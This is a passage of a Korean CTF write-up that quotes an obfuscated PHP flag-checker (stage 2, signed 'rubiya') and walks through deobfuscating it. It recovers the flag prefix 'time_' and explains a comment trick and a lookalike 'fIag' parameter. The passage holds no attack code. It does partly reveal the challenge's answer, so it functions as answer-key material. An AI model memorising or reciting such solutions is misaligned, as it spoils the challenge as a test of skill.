&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$á&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$à&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$á&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;wrong&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;$á&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;round&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sqrt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$á&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$á&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$á&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sqrt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$á&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$à&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;pow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$á&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;round&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sqrt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$á&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$á&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$á&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]],&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$á&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;round&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sqrt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$á&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$á&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$á&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]])])&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$á&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$á&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$á&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;wrong&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;$á&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$$a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$à&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$$a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$á&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;â&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$á&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$$a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sqrt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$á&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$$a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$à&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$á&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$á&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$$a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]])&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;wrong&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;


&lt;span class=&quot;nv&quot;&gt;$flag_array&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;111&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;95&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;         &lt;span class=&quot;cm&quot;&gt;/*
    114,            *        this is stage2 of challenge.
    117,            *          i think this stage is easy,
    98,         *  but you should read code deliberately
    105,            *     i hope you enjoy ctf and have fun.
    121,            *               from your friend
    97,         *                     rubiya
    95,         */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;mo&quot;&gt;060&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$flag_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$flag_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$flag_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$count&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$count&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sqrt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$á&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$$a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$count&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fIag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$count&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$flag_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$count&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fIag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$count&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;wrong&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$flag_len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$length_chk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$flag_len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$length_chk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$flag_len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$length_chk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;110&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$length_chk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;130&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;wrong&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$stage3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;substr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$stage3_1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;substr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$stage3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$stage3_2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;substr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$stage3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;stage3_&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$stage3_1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$stage3_2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;stage3_143193195211162158&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;wrong&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;You did it!&amp;lt;br&amp;gt;Flag is {&amp;lt;strong&amp;gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;/strong&amp;gt;}&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;동일한 동작을 위해 최대한 비슷한 PHP 버전에서 시도해야 합니다. &lt;a href=&quot;http://sandbox.onlinephpfunctions.com/&quot;&gt;Online PHP Functions의 PHP Sandbox&lt;/a&gt;에서 PHP 5.2.16 환경으로 작업했습니다.&lt;/p&gt;

&lt;p&gt;일단 라틴 알파벳들은 보기 쉬운 알파벳들로 바꾸고, 계산 작업을 수행해 줍니다.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;$_a = array(0);
$_a[a] = 4;
$_a[c] = 17;
$b = $_GET[flag];
if (ord($b[0]) != 116) exit(&quot;wrong&quot;);
$_a[1] = 102;
if (ord($b[1]) != 105) exit(&quot;wrong&quot;);
$_a[2] = 64;
if (101 != ord($b[3])) exit(&quot;wrong&quot;);
$_a[64] = 2;
if (ord($b[4]) != 95) exit(&quot;wrong&quot;);
$_a[] = 100;
if (chr(109) != $b[2]) exit(&quot;wrong&quot;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;간단히 &lt;code&gt;$_GET[flag]&lt;/code&gt;의 앞 글자 다섯 자리가 &lt;code&gt;time_&lt;/code&gt;이라는 것을 알아낼 수 있습니다.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;$flag_array&lt;/code&gt;의 경우 주석 때문에 가운데 영역이 주석 처리됩니다.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;$flag_array = array(
    7,
    111,
    95,
    100,
    060
);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;첫 번째 &lt;code&gt;for&lt;/code&gt; 문은 한 줄로 끝나는 것으로, 다음 줄부터는 들여 쓰는 것이 아닙니다. &lt;code&gt;$i&lt;/code&gt;도 &lt;code&gt;for&lt;/code&gt; 문이 끝났으므로 &lt;code&gt;5&lt;/code&gt;로 값이 고정되어 있습니다. 또한 &lt;code&gt;$_GET[flag]&lt;/code&gt;가 아닌 &lt;code&gt;$_GET[fIag]&lt;/code&gt;가 있는 것에 주의하시기 바랍니다.&lt;/p&gt;
